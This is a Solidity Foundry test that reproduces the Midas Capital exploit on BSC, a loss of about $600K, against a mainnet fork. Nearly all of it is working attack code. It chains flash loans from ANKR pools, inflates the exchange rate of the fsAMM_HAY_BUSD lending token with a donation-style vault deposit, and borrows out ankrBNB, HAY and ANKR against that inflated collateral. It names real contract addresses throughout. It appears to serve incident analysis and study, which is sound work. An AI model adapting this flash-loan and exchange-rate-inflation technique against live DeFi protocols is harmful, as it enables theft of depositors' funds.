// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "./../basetest.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$600K
// Attacker : https://bscscan.com/address/0x4b92cc3452ef1e37528470495b86d3f976470734
// Attack Contract : https://bscscan.com/address/0xc40119c7269a5fa813d878bf83d14e3462fc8fde
// Vulnerable Contract : https://bscscan.com/address/0xf8527dc5611b589cbb365acacaac0d1dc70b25cb
// Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x4a304ff08851106691f626045b0f55d403e3a0958363bdf82b96e8ce7209c3a6

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0xf8527dc5611b589cbb365acacaac0d1dc70b25cb#code

// @Analysis
// Post-mortem : https://medium.com/midas-capital/midas-exploit-post-mortem-1ae266222994

interface IHAY_BUSDT_Vault {
    function deposit(uint256 amount, address to) external returns (uint256);
}

interface IankrBNB_WBNB {
    function swap(
        address recipient,
        bool zeroToOne,
        int256 amountRequired,
        uint160 limitSqrtPrice,
        bytes memory data
    ) external returns (int256 amount0, int256 amount1);
}

contract MidasXYZExploit is Test {
    IERC20 private constant ANKR = IERC20(0xf307910A4c7bbc79691fD374889b36d8531B08e3);
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    IERC20 private constant HAY = IERC20(0x0782b6d8c4551B9760e74c0545a9bCD90bdc41E5);
    IERC20 private constant BUSDT = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IWBNB private constant WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    Uni_Pair_V2 private constant ankrBNB_ANKRV2 = Uni_Pair_V2(0x8028AC1195B6469de22929C4f329f96B06d65F25);
    Uni_Pair_V3 private constant ankrBNB_ANKRV3 = Uni_Pair_V3(0xC8Cbf9b12552c0B85fc368AA530cc31E00526E2F);
    Uni_Pair_V2 private constant HAY_BUSDT = Uni_Pair_V2(0x93B32a8dfE10e9196403dd111974E325219aec24);
    ISimplePriceOracle private constant Oracle = ISimplePriceOracle(0xB641c21124546e1c979b4C1EbF13aB00D43Ee8eA);
    ICErc20Delegate private constant fsAMM_HAY_BUSD =
        ICErc20Delegate(payable(0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB));
    Uni_Pair_V3 private constant WBNB_BUSDT = Uni_Pair_V3(0x85FAac652b707FDf6907EF726751087F9E0b6687);
    IHAY_BUSDT_Vault private constant HAY_BUSDT_Vault = IHAY_BUSDT_Vault(0x02706A482fc9f6B20238157B56763391a45bE60E);
    IankrBNB_WBNB private constant ankrBNB_WBNB = IankrBNB_WBNB(0x2F6C6e00E517944EE5EFE310cd0b98A3fC61Cb98);

    uint256 private constant blocknumToForkFrom = 29_185_768;
    uint160 private constant sqrtPriceLimitX96 = 4_295_128_740;
    Borrower private borrower;

    function setUp() public {
        vm.createSelectFork("bsc", blocknumToForkFrom);
        vm.label(address(ANKR), "ANKR");
        vm.label(address(ankrBNB_ANKRV2), "ankrBNB_ANKRV2");
        vm.label(address(ankrBNB_ANKRV3), "ankrBNB_ANKRV3");
        vm.label(address(HAY_BUSDT), "HAY_BUSDT");
        vm.label(address(Oracle), "Oracle");
        vm.label(address(fsAMM_HAY_BUSD), "fsAMM_HAY_BUSD");
        vm.label(address(WBNB_BUSDT), "WBNB_BUSDT");
    }

    function testExploit() public {
        // Initial HAY and BUSDT amounts transfered by exploiter to this contract before attack start
        deal(address(HAY), address(this), 220_000e18);
        deal(address(BUSDT), address(this), 23_000e18);

        emit log_named_decimal_uint(
            "Exploiter ankrBNB balance before attack",
            ankrBNB.balanceOf(address(this)),
            ankrBNB.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter ANKR balance before attack",
            ANKR.balanceOf(address(this)),
            ANKR.decimals()
        );

        ankrBNB_ANKRV2.swap(0, ANKR.balanceOf(address(ankrBNB_ANKRV2)) - 1, address(this), bytes("_"));

        emit log_named_decimal_uint(
            "Exploiter ANKR balance after attack",
            ANKR.balanceOf(address(this)),
            ANKR.decimals()
        );

        emit log_named_decimal_uint(
            "Exploiter ankrBNB balance after attack",
            ankrBNB.balanceOf(address(this)),
            ankrBNB.decimals()
        );
    }

    function pancakeCall(address _sender, uint256 _amount0, uint256 _amount1, bytes calldata _data) external {
        borrower = new Borrower();
        ANKR.transfer(address(borrower), _amount1);
        uint256 flashAmount = ANKR.balanceOf(address(ankrBNB_ANKRV3));
        bytes memory data = abi.encode(flashAmount, _amount1);
        ankrBNB_ANKRV3.flash(address(borrower), 0, ANKR.balanceOf(address(ankrBNB_ANKRV3)), data);
    }

    function algebraFlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        (uint256 flashRepayAmountV3, uint256 flashRepayAmountV2) = abi.decode(data, (uint256, uint256));
        uint256 liquidityMinted = transferTokensAndMintLiqudity(20_000e18);
        HAY_BUSDT.approve(address(fsAMM_HAY_BUSD), type(uint256).max);
        fsAMM_HAY_BUSD.mint(liquidityMinted);
        fsAMM_HAY_BUSD.redeem(fsAMM_HAY_BUSD.balanceOf(address(this)) - 1_001);
        HAY_BUSDT.approve(address(HAY_BUSDT_Vault), type(uint256).max);
        HAY_BUSDT_Vault.deposit(HAY_BUSDT.balanceOf(address(this)), address(fsAMM_HAY_BUSD));
        fsAMM_HAY_BUSD.transfer(address(borrower), 1_001);
        borrower.execute();
        Minter minter = new Minter();
        ankrBNB.transfer(address(minter), 115e18);
        minter.mint();
        uint256 amountRequired = ankrBNB.balanceOf(address(this)) - 1e18;
        ankrBNB_WBNB.swap(
            address(this),
            true,
            int256(amountRequired),
            sqrtPriceLimitX96, // limitSqrtPrice
            bytes("")
        );

        WBNB_BUSDT.swap(
            address(this),
            true,
            int256(WBNB.balanceOf(address(this)) - 1e18),
            sqrtPriceLimitX96,
            bytes("")
        );
        liquidityMinted = transferTokensAndMintLiqudity(HAY.balanceOf(address(this)));
        HAY_BUSDT_Vault.deposit(liquidityMinted, address(fsAMM_HAY_BUSD));
        borrower.exit();
        ANKR.transfer(address(ankrBNB_ANKRV3), flashRepayAmountV3 + fee1);
        ANKR.transfer(address(ankrBNB_ANKRV2), (flashRepayAmountV2 * 10_026) / 10_000);
    }

    function algebraSwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {
        ankrBNB.transfer(msg.sender, uint256(amount0Delta));
    }

    function pancakeV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata _data) external {
        WBNB.transfer(msg.sender, uint256(amount0Delta));
    }

    function transferTokensAndMintLiqudity(uint256 amount) private returns (uint256 liquidity) {
        (uint112 reserveHAY, uint112 reserveBUSDT, ) = HAY_BUSDT.getReserves();
        uint256 transferAmountBUSDT = (amount * reserveBUSDT) / reserveHAY;
        HAY.transfer(address(HAY_BUSDT), amount);
        BUSDT.transfer(address(HAY_BUSDT), transferAmountBUSDT);
        return HAY_BUSDT.mint(address(this));
    }
}

contract Borrower is Test {
    IERC20 private constant ANKR = IERC20(0xf307910A4c7bbc79691fD374889b36d8531B08e3);
    ICErc20Delegate private constant fANKR = ICErc20Delegate(payable(0x13aE975c5A1198e4F47c68C31C1230694DC44A57));
    ICErc20Delegate private constant fankrBNB = ICErc20Delegate(payable(0xb2b01D6f953A28ba6C8f9E22986f5bDDb7653aEa));
    ICErc20Delegate private constant fHAY = ICErc20Delegate(payable(0x10b6f851225c203eE74c369cE876BEB56379FCa3));
    ICErc20Delegate private constant fsAMM_HAY_BUSD =
        ICErc20Delegate(payable(0xF8527Dc5611B589CbB365aCACaac0d1DC70b25cB));
    ICointroller private constant Unitroller = ICointroller(0x1851e32F34565cb95754310b031C5a2Fc0a8a905);
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    IERC20 private constant HAY = IERC20(0x0782b6d8c4551B9760e74c0545a9bCD90bdc41E5);

    function execute() external {
        ANKR.approve(address(fANKR), type(uint256).max);
        fANKR.mint(ANKR.balanceOf(address(this)));

        address[] memory fTokens = new address[](2);
        fTokens[0] = address(fANKR);
        fTokens[1] = address(fsAMM_HAY_BUSD);
        Unitroller.enterMarkets(fTokens);
        uint256 borrowAmount = fankrBNB.getCash();
        fankrBNB.borrow(borrowAmount);
        borrowAmount = fHAY.borrow(borrowAmount);
        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));
        HAY.transfer(msg.sender, HAY.balanceOf(address(this)));
        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));
    }

    function exit() external {
        fsAMM_HAY_BUSD.transfer(msg.sender, 1);
        uint256 borrowAmount = fankrBNB.getCash();
        fankrBNB.borrow(borrowAmount);
        Unitroller.exitMarket(address(fANKR));
        borrowAmount = (686_000e18 - fANKR.totalBorrowsCurrent()) - 1;
        fANKR.borrow(borrowAmount);
        fANKR.redeem(fANKR.balanceOf(address(this)));
        ankrBNB.transfer(msg.sender, ankrBNB.balanceOf(address(this)));
        ANKR.transfer(msg.sender, ANKR.balanceOf(address(this)));
    }
}

contract Minter is Test {
    IERC20 private constant ankrBNB = IERC20(0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827);
    ICErc20Delegate private constant fankrBNB = ICErc20Delegate(payable(0xb2b01D6f953A28ba6C8f9E22986f5bDDb7653aEa));

    function mint() external {
        ankrBNB.approve(address(fankrBNB), type(uint256).max);
        fankrBNB.mint(ankrBNB.balanceOf(address(this)));
    }
}
